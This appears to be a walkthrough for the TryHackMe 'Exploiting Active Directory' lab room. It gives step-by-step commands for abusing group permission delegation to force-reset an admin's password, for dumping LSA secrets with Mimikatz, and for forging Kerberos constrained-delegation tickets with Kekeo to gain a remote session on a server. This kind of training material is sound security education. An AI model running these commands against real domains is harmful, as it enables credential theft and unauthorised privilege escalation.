# Exploiting Active Directory

**Room Link:** [https://tryhackme.com/room/exploitingad](https://tryhackme.com/room/exploitingad)

## Introduction

**Kali**

```
systemd-resolve --interface exploitad --set-dns $THMDCIP --set-domain za.tryhackme.loc
nslookup thmdc.za.tryhackme.loc 
```



<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
ssh za.tryhackme.loc\$VICTIM_USERNAME@thmwrk1.za.tryhackme.loc
```

## Exploiting Permission Delegation

**Kali**

```
neo4j console start
```

**Kali**

```
bloodhound --no-sandbox
```

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>



**Victim(powershell)**

```
powershell
Add-ADGroupMember "IT Support" -Members "$VICTIM_USERNAME"
Get-ADGroupMember -Identity "IT Support"
```

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

### ForceChangePassword

Now that we are a member of the _IT Support_ group, we have inherited the ForceChangePassword Permission Delegation over the _Tier 2 Admins_ group. First, we need to identify the members of this group to select a target. We can use the Get-ADGroupMember cmdlet again to assist with this:

**Victim(powershell)**

```
Get-ADGroupMember -Identity "Tier 2 Admins"
```

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

**Victim(powershell)**

```
$Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force 
Set-ADAccountPassword -Identity "t2_henry.harvey" -Reset -NewPassword $Password 
```

**Note:** If you get an Access Denied error, your permissions have not yet propagated through the domain. This can take up to 10 minutes. The best approach is to terminate your SSH or RDP session, take a quick break, and then reauthenticate and try again. You could also run `gpupdate /force` and then disconnect and reconnect, which in certain cases will cause the synchronisation to happen faster.

**Kali**

```
ssh t2_henry.harvey@thmwrk1.za.tryhackme.loc
Password: New.Password.For.User
```

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

## Exploiting Kerberos Delegation

### Constrained Delegation Exploitation

We will exploit Constrained Delegation for this task. The first thing we need to do is enumerate available delegations. Let's use our new privileged user for the network couple of commands. We can use the Get-NetUser cmdlet of PowerSploit for this enumeration by running the following command.

**Victim(powershell)**

```
powershell
Import-Module C:\Tools\PowerView.ps1 
Get-NetUser -TrustedToAuth
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Based on the output of this command, we can see that the svcIIS account can delegate the HTTP and WSMAN services on THMSERVER1. You would think that this means we can only access websites on behalf of impersonated users. However, PowerShell Remoting uses the HTTP and WSMAN services as well. The ideal option would be to impersonate a Tier 1 Admin since this would provide us with administrative access over THMSERVER1.

If you were to perform proper post-exploitation enumeration of THMWRK1, you would find that there is a service on the host running as the svcIIS user. Since we have administrative access now, we can use this to dump LSASecrets, part of the Windows Registry Hive where credentials are stored for features such as Windows services. Let's use [Mimikatz](https://github.com/gentilkiwi/mimikatz/security) to dump the secrets.

**Victim(powershell)**

```
C:\Tools\mimikatz_trunk\x64\mimikatz.exe
```

**Victim(mimikatz)**

```
token::elevate
lsadump::secrets
```

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

Let's run through the two commands:

* token::elevate - To dump the secrets from the registry hive, we need to impersonate the SYSTEM user.
* lsadump::secrets - Mimikatz interacts with the registry hive to pull the clear text credentials.

Now that we have access to the password associated with the svcIIS account, we can perform a Kerberos delegation attack. We will use a combination of [Kekeo](https://github.com/gentilkiwi/kekeo) and [Mimikatz](https://github.com/gentilkiwi/mimikatz/security). You can use another window for Mimikatz, but make sure to exit out of Mimikatz after the `token::elevate` command, otherwise the tickets will be loaded in the wrong context later on. We will use Kekeo to generate our tickets and then use Mimikatz to load those tickets into memory. Let's start by generating the tickets:

**Victim(powershell)**

```
C:\Tools\kekeo\x64\kekeo.exe
```

**Victim(kekeo)**

```
tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@
```

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

Parameters explained:

* user - The user who has the constrained delegation permissions.
* domain - The domain that we are attacking since Kekeo can be used to forge tickets to abuse cross-forest trust.
* password - The password associated with the svcIIS account.\


Now that we have the TGT for the account that can perform delegation, we can forge TGS requests for the account we want to impersonate. We need to perform this for both HTTP and WSMAN to allow us to create a PSSession on THMSERVER1:

**Victim(kekeo)**

```
tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc

tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.l
oc

exit
```

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Parameters explained:

* tgt - We provide the TGT that we generated in the previous step.
* user - The user we want to impersonate. Since t2\_ accounts have administrative access over workstations, it is a safe assumption that t1\_ accounts will have administrative access over servers, so choose a t1\_ account that you would like to impersonate.\

* service - The services we want to impersonate using delegation. We first generate a TGS for the HTTP service. Then we can rerun the same command for the WSMAN service.

Run the command again, this time for the WSMAN service. Now that we have the two TGS tickets, we can use Mimikatz to import them:

**Victim(powershell)**

```
C:\Tools\mimikatz_trunk\x64\mimikatz.exe
```

**Victim(mimikatz)**

```
privilege::debug
kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
exit
```

**Victim(powershell)**

```
klist
New-PSSession -ComputerName thmserver1.za.tryhackme.loc
```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Victim(powershell)**

```
Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>





